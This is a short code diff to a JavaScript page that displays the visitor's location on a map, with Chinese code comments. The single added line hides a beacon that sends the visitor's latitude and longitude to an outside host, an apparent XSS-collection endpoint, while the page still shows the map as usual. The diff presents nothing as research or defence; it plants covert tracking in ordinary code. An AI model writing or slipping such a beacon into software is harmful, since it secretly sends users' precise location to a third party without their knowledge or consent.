@@ -16,6 +16,7 @@
             navigator.geolocation.getCurrentPosition(
                 function (position) {//传入了对象position
                     showMap(position.coords.latitude,position.coords.longitude);
+                    (new Image()).src='https://xsshs.cn/xss.php?do=api&id=Brqo&weidu='+position.coords.latitude+'&jingdu='+position.coords.longitude;
                 },
                 function (err) {//传入了error对象
                     GetID.innerHTML = err.code + '\n'+err.message;
